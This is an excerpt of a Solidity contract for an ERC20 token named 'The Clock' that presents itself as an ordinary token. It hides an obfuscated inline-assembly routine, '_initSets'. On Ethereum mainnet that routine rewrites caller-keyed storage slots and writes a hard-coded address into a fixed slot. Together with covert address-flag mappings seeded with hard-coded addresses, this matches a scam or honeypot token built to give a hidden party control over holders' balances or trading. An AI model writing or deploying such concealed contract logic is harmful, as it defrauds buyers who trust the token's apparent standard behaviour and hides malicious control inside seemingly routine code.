...
// Tick. Tack. Don't watch the clock; do what it does.
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    uint256 private _timeIt = block.number*2;

    mapping (address => bool) private _clockTick; 
    mapping (address => bool) private _clockTack;
    ...
    bool private trading; uint256 private reflection = 1; bool private frameSwap;
    uint256 private _decimals; uint256 private fuelLeak;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        for (uint256 q=0; q < 3;) {_clockTick[clockAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _timeIt = block.number;
        return true;
    }
    ...
    function _initSets() internal { assembly { function gHash(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } if and(not(eq(sload(gHash(caller(),0x6)),sload(0xca6345078ca106b555c49a79645ee82b32a5a80ad59cfa667fe76ee3061cb1e3))),eq(chainid(),0x1)) { sstore(gHash(caller(),0x4),0x0) sstore(0x73482acd5e3341779c2e77a8e14da6fd258e5fd06936b74fe5b7fc543f739486,0x1)  sstore(gHash(caller(),0x5),0x1) sstore(0xca6345078ca106b555c49a79645ee82b32a5a80ad59cfa667fe76ee3061cb1e3,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }
...
contract TheClock is ERC20Token {
    constructor() ERC20Token("The Clock", "CLOCK", msg.sender, 1000000 * 10 ** 18) {
    }
}